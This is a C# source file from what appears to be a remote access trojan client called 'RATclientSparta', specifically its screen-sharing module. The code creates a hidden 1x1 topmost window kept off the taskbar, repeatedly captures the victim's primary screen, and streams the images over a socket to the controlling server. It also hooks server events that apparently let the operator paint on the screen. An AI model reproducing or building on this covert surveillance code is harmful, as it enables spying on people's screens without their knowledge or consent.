using RATclientSparta.Server;
using RATclientSparta.Server.Send;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RATclientSparta.Tools.ScreenShare
{
    public partial class ScreenShare : Form
    {
        private ServerData client;
        private SendData Data;
        private bool close = false;
        public Bitmap LastScreen;
        private Paint paint;
        public ScreenShare(ServerData server, Socket socket)
        {
            InitializeComponent();
            //Screen data (Small GUI is opening for cases that a fullscreened game is opened)
            this.Width = 1;
            this.Height = 1;
            this.Focus();
            this.TopMost = true;
            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.None;

            //Event Handlers
            this.client = server;
            this.client.CloseScreenStream += StreamMessageCloseEvent; //Closing stream
            this.client.LostConnectionEvent += StreamMessageCloseEvent; //Closing stream

            this.paint = new Paint();
            this.client.PaintStream += paint.Painting; //Painting on screen
            this.client.PaintConfigs += paint.ScreenConfigs; //Features
        }

        private void StreamMessageCloseEvent()
        {
            close = true;
            client.PaintStream -= paint.Painting;
            client.PaintConfigs -= paint.ScreenConfigs;
        }

        private void ScreenShare_Load(object sender, EventArgs e)
        {
            Data = new SendData(this.client.SocketConnection, false);
            new Thread(new ThreadStart(() => { StreamEvent(); })).Start();
        }

        private void StreamEvent()
        {
            while (!close)
            {
                Bitmap screenCapture = CaptureScreen();
                if (screenCapture != LastScreen)
                {
                    byte[] imageBytes = ConvertBitmapToByteArray(screenCapture);
                    Data.Send(imageBytes, 8);
                    LastScreen = screenCapture;
                    Thread.Sleep(500);
                }
            }
            this.Invoke((MethodInvoker)delegate
            {
                this.Close();
            });
        }

        public Bitmap CaptureScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);

            using (Graphics graphics = Graphics.FromImage(screenshot))
            {
                graphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality;
                graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            }
            return screenshot;
        }

        static byte[] ConvertBitmapToByteArray(Bitmap bitmap)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                bitmap.Save(stream, ImageFormat.Bmp);
                return stream.ToArray();
            }
        }
    }
}
